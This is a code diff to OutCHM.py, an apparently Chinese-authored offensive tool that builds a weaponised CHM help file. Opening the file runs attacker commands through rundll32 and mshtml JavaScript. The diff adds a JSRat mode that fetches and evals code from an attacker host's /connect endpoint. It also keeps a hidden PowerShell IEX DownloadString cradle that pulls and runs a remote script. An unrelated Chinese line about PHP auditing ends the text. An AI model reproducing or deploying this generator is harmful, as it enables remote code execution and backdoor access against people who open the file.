@@ -17,11 +17,12 @@ OutCHM.py -p 'whoami > c://1.txt'
 epilog='方便快捷！')
 parser.add_argument('-p', '--payload', help='-p c:\\\windows\\\command')
 parser.add_argument('-r', '--rshell', help='-r http://192.168.0.100:8080', default='http://192.168.0.100:8080')
+parser.add_argument('-j', '--jsrat', help='-j http://192.168.0.100:8000', default='http://192.168.0.100:8000')
 parser.add_argument('-o', '--outfile', help='-o exp.chm', default='exp.chm')
 args=parser.parse_args()
 
-if args.payload is not None and args.rshell is not None:
-    print '-p 或 -r 只能选一个'
+if args.payload is not None and args.rshell is not None and args.jsrat is not None:
+    print '-p 或 -r 或 -j 只能选一个'
     sys.exit(0)
 
 if len(sys.argv) < 1:
@@ -30,10 +31,16 @@ if len(sys.argv) < 1:
 command=''
 
 if args.payload is not None:
-    command=args.payload
+    # command=args.payload
+    command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("' + args.payload + '",0,true);'
 
 if args.rshell is not None:
-    command='powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString(&#39;' + args.rshell + '&#39;));&cmd /c taskkill /f /im rundll32.exe'
+    # command='powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString(&#39;' + args.rshell + '&#39;));&cmd /c taskkill /f /im rundll32.exe'
+    command='''javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString(&#39;''' + args.rshell + '''&#39;));&cmd /c taskkill /f /im rundll32.exe'",0,true);'''
+    
+if args.jsrat is not None:
+    command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","' + args.jsrat + '/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}'
+    # 這裡填入jsrat的修正版
 
 if command is None:
     print '请输入参数'
@@ -45,7 +52,7 @@ exp_htm='''<!DOCTYPE html><html>
 <OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
 <PARAM name="Command" value="ShortCut">
  <PARAM name="Button" value="Bitmap::shortcut">
- <PARAM name="Item1" value=',rundll32.exe,javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("{0}",0,true);'>
+ <PARAM name="Item1" value=',rundll32.exe,{0}'>
  <PARAM name="Item2" value="273,1,1">
 </OBJECT>
 高级PHP应用程序漏洞审核技术
